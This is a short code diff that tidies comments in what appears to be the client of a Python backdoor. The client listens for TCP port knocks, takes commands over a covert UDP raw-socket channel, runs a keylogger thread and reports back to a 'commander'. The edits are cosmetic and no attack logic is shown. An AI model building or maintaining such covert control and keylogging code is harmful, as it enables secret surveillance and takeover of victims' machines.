@@ -67,9 +67,7 @@ COMMAND_CODES = frozenset([
 
 class Client:
     """
-    Client that:
-    1. Listens for TCP port knocks
-    2. After successful knock, accepts commands via UDP raw socket covert channel
+    Listens for TCP port knocks. After successful knock, accepts commands via UDP raw socket covert channel
     """
 
     def __init__(self, knock_sequence=None):
@@ -161,9 +159,6 @@ class Client:
         finally:
             sock.close()
 
-    # ------------------------------------------------------------------ #
-    #  Covert channel listener                                            #
-    # ------------------------------------------------------------------ #
 
     def _reset_transfer_state(self):
         """Return a clean slate for a new inbound transfer."""
@@ -292,10 +287,6 @@ class Client:
         except Exception as e:
             print(f"Fatal error: {e}")
             sys.exit(1)
-
-    # ------------------------------------------------------------------ #
-    #  Command handlers                                                    #
-    # ------------------------------------------------------------------ #
 
     def process_command(self, command_type, payload, src_ip):
         """Dispatch and handle a fully-reassembled command."""
@@ -619,11 +610,6 @@ class Client:
             self._keylogger_thread.join(timeout=3)
             self._keylogger_thread = None
         self._keylogger_stop.clear()
-
-
-    # ------------------------------------------------------------------ #
-    #  Response sender                                                     #
-    # ------------------------------------------------------------------ #
 
     def send_response(self, dst_ip, command_type, payload):
         """Send a response back to the commander via the covert channel."""
